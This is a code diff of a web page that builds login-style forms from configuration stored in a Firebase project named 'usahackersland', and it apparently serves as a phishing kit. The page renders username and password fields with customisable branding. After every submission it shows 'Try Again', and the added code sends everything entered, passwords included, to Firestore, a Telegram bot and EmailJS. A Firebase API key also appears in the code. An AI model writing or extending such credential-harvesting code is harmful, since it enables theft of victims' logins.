@@ -19,6 +19,7 @@ body{
   font-family: Arial, sans-serif;
   background:#f4f6f8;
   padding:20px;
+  transition: background 0.3s;
 }
 
 #formContainer{
@@ -28,151 +29,65 @@ body{
   padding:20px;
   border-radius:10px;
   box-shadow:0 0 10px rgba(0,0,0,0.1);
+  transition: background 0.3s;
 }
 
-/* BUILDER MEDIA */
-.builder-media{
-  text-align:center;
-  margin-bottom:12px;
-}
-.builder-media img{
-  max-width:140px;
-  height:auto;
-  margin-bottom:8px;
-}
+.builder-media{text-align:center;margin-bottom:12px;}
+.builder-media img, .builder-media video{max-width:100%;margin-bottom:8px;border-radius:6px;}
 
-/* TEXT */
-h2{
-  text-align:center;
-  margin:10px 0;
-}
-#formDesc{
-  text-align:center;
-  margin-bottom:12px;
-}
+h2{text-align:center;margin:10px 0;}
+#formDesc{text-align:center;margin-bottom:12px;}
+#formID{text-align:center;font-size:12px;color:#555;margin-bottom:10px;}
 
-/* WARNINGS */
-#failureWarning{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:4px;
-}
-#submitResult{
-  color:#b71c1c;
-  font-weight:bold;
-  text-align:center;
-  margin-bottom:10px;
-  opacity:0;
-  transition:opacity 0.5s;
-}
+#failureWarning{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:4px;}
+#submitResult{color:#b71c1c;font-weight:bold;text-align:center;margin-bottom:10px;opacity:0;transition:opacity 0.5s;}
 
-/* INPUTS */
-input, textarea, button{
-  width:100%;
-  padding:10px;
-  margin:8px 0;
-  border-radius:6px;
-  border:1px solid #ccc;
-  box-sizing:border-box;
-}
+input, textarea, button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box;}
+button{cursor:pointer;background:#1976d2;color:#fff;border:none;}
 
-button{
-  cursor:pointer;
-  background:#1976d2;
-  color:#fff;
-  border:none;
-}
-
-/* EMBED LINKS */
-.embedLink{
-  margin-top:6px;
-  padding:6px;
-  background:#e8f0fe;
-  border-radius:6px;
-  word-break:break-all;
-}
+.embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px;word-break:break-all;}
 </style>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
 </head>
-
 <body>
 <div id="formContainer">
 
-  <!-- BUILDER MEDIA -->
+  <div id="formID"></div>
+
   <div id="imageContainer" class="builder-media"></div>
 
-  <!-- TITLE & DESC -->
   <h2 id="formTitle">Loading...</h2>
   <div id="formDesc"></div>
 
-  <!-- WARNINGS -->
   <div id="failureWarning"></div>
   <div id="submitResult">⚠️ Try Again</div>
 
-  <!-- FORM -->
   <form id="dynamicForm"></form>
 
-  <!-- LINKS -->
   <div id="embedLinks"></div>
 
 </div>
 
 <script>
-const $ = id => document.getElementById(id);
+const $ = id=>document.getElementById(id);
 
-/* 🔥 UPDATE SEO + OG TAGS */
-/* 🔥 UPDATE SEO + OG TAGS */
-function applySEOMeta(config){
-  if(!config) return;
-
-  // Page title
-  document.title = config.seoTitle || config.title || "Form";
-
-  // Meta description
-  document.querySelector('meta[name="description"]').setAttribute(
-    "content",
-    config.metaDesc || config.description || ""
-  );
-
-  // OG Title
-  document.querySelector('meta[property="og:title"]').setAttribute(
-    "content",
-    config.seoTitle || config.title || ""
-  );
-
-  // OG Description
-  document.querySelector('meta[property="og:description"]').setAttribute(
-    "content",
-    config.metaDesc || config.description || ""
-  );
-
-  // OG Image
-  if(config.ogImage){
-    document.querySelector('meta[property="og:image"]').setAttribute(
-      "content",
-      config.ogImage
-    );
-  }
-
-  // ✅ OG URL (important for Facebook, WhatsApp, Telegram)
-  let ogUrlTag = document.querySelector('meta[property="og:url"]');
-  if (!ogUrlTag) {
-    ogUrlTag = document.createElement("meta");
-    ogUrlTag.setAttribute("property", "og:url");
-    document.head.appendChild(ogUrlTag);
-  }
-  ogUrlTag.setAttribute("content", window.location.href);
-}
-/* FIREBASE */
+/* FIREBASE INIT */
 firebase.initializeApp({
   apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
   authDomain: "usahackersland.firebaseapp.com",
   projectId: "usahackersland"
 });
 const db = firebase.firestore();
+
+/* EMAILJS INIT */
+emailjs.init("YOUR_EMAILJS_USER_ID"); // replace with your EmailJS user ID
+
+/* TELEGRAM CONFIG */
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; // replace with your bot token
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"; // replace with your chat id
 
 /* PARAMS */
 const formId = new URLSearchParams(location.search).get("id");
@@ -181,11 +96,23 @@ const imageContainer = $("imageContainer");
 const embedEl = $("embedLinks");
 const submitResult = $("submitResult");
 const failureWarning = $("failureWarning");
+const formIDEl = $("formID");
 
 let formConfig = null;
 
 if(!formId){
   $("formTitle").innerText = "Form ID missing!";
+}
+
+/* APPLY SEO + OG TAGS */
+function applySEOMeta(config){
+  if(!config) return;
+  document.title = config.seoTitle || config.title || "Form";
+  document.querySelector('meta[name="description"]').setAttribute("content", config.metaDesc || config.description || "");
+  document.querySelector('meta[property="og:title"]').setAttribute("content", config.seoTitle || config.title || "");
+  document.querySelector('meta[property="og:description"]').setAttribute("content", config.metaDesc || config.description || "");
+  if(config.ogImage) document.querySelector('meta[property="og:image"]').setAttribute("content", config.ogImage);
+  document.querySelector('meta[property="og:url"]').setAttribute("content", window.location.href);
 }
 
 /* LOAD FORM */
@@ -195,104 +122,98 @@ db.collection("forms").doc(formId).get().then(doc=>{
     return;
   }
   formConfig = doc.data();
-
-/* ✅ APPLY SEO & OG */
-applySEOMeta(formConfig);
-
-renderForm();
+  applySEOMeta(formConfig);
+  renderForm();
 });
 
-/* RENDER BUILDER-ACCURATE (NO EXTRA INPUTS) */
+/* RENDER FORM */
 function renderForm(){
+  formIDEl.innerText = "Form ID: " + formId;
   $("formTitle").innerText = formConfig.title || "";
   $("formTitle").style.color = formConfig.titleColor || "#000";
-
   $("formDesc").innerText = formConfig.description || "";
   $("formDesc").style.color = formConfig.textColor || "#444";
+
+  if(formConfig.bgColor) document.body.style.background = formConfig.bgColor;
+  if(formConfig.bgImage) document.body.style.backgroundImage = `url('${formConfig.bgImage}')`;
 
   imageContainer.innerHTML = "";
   formEl.innerHTML = "";
   embedEl.innerHTML = "";
   failureWarning.innerText = "";
 
-  /* MEDIA */
-  if(formConfig.avatarURL){
-    imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
-  }
-  if(formConfig.logoURL){
-    imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
-  }
+  if(formConfig.avatarURL) imageContainer.innerHTML += `<img src="${formConfig.avatarURL}" style="width:90px;border-radius:50%">`;
+  if(formConfig.logoURL) imageContainer.innerHTML += `<img src="${formConfig.logoURL}">`;
+  if(Array.isArray(formConfig.videos)) formConfig.videos.forEach(v=>{
+    imageContainer.innerHTML += `<video controls src="${v}" style="max-width:100%;margin-bottom:8px;"></video>`;
+  });
 
-  /* WARNING */
-  if(formConfig.enableWarning && formConfig.warning){
-    failureWarning.innerText = formConfig.warning;
-  }
+  if(formConfig.enableWarning && formConfig.warning) failureWarning.innerText = formConfig.warning;
 
-  /* AUTH FIELDS — ONLY IF PLACEHOLDERS EXIST */
-  if(
-    formConfig.addAuth &&
-    formConfig.usernamePlaceholder &&
-    formConfig.passwordPlaceholder
-  ){
+  if(formConfig.addAuth && formConfig.usernamePlaceholder && formConfig.passwordPlaceholder){
     formEl.innerHTML += `
       <input name="username" placeholder="${formConfig.usernamePlaceholder}" required>
       <input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required>
     `;
   }
 
-  /* EXTRA FIELDS — FILTER EMPTY */
   if(Array.isArray(formConfig.extraFields)){
-    formConfig.extraFields
-      .filter(f => typeof f === "string" && f.trim() !== "")
-      .forEach(f=>{
-        formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
-      });
+    formConfig.extraFields.filter(f=>f && f.trim()!=="").forEach(f=>{
+      formEl.innerHTML += `<input name="${f}" placeholder="${f}" required>`;
+    });
   }
 
-  /* MAIN BUTTON */
   if(formConfig.showMainBtn && formConfig.buttonText){
     const btn = document.createElement("button");
     btn.textContent = formConfig.buttonText;
     btn.style.background = formConfig.btnColor || "#1976d2";
-    btn.onclick = submitForm;
     formEl.appendChild(btn);
   }
 
-  /* EMBED LINKS */
   if(Array.isArray(formConfig.embedLinks)){
     formConfig.embedLinks.forEach(l=>{
       if(!l || !l.show || !l.url) return;
       embedEl.innerHTML += `
         <div class="embedLink">
-          <strong>${l.text || ""}</strong><br>
+          <strong>${l.text||""}</strong><br>
           <a href="${l.url}" target="_blank">${l.url}</a>
-          ${l.desc ? `<br><small>${l.desc}</small>` : ""}
+          ${l.desc? `<br><small>${l.desc}</small>` : ""}
         </div>
       `;
     });
   }
+
+  formEl.querySelectorAll("button").forEach(btn=> btn.onclick = submitForm);
 }
 
 /* SUBMIT */
 function submitForm(e){
   e.preventDefault();
-
   const data = {};
   formEl.querySelectorAll("input,textarea").forEach(i=>{
-    if(i.value.trim() !== ""){
-      data[i.name] = i.value;
-    }
+    if(i.value.trim()!=="") data[i.name]=i.value;
   });
 
-  db.collection("submissions").add({
-    formId,
-    data,
-    createdAt: new Date().toISOString()
+  // Save to Firebase
+  db.collection("submissions").add({ formId, data, createdAt: new Date().toISOString() });
+
+  // Telegram Alert
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {'Content-Type':'application/json'},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: `New Form Submission (ID: ${formId}):\n` + JSON.stringify(data, null, 2)
+    })
   });
 
-  submitResult.style.opacity = 1;
-  setTimeout(()=>submitResult.style.opacity = 0, 3000);
+  // Email Alert via EmailJS
+  emailjs.send("YOUR_SERVICE_ID","YOUR_TEMPLATE_ID",{formId,data})
+  .then(()=>console.log("Email sent"))
+  .catch(err=>console.error("Email error",err));
 
+  submitResult.style.opacity=1;
+  setTimeout(()=>submitResult.style.opacity=0,3000);
   formEl.reset();
 }
 </script>
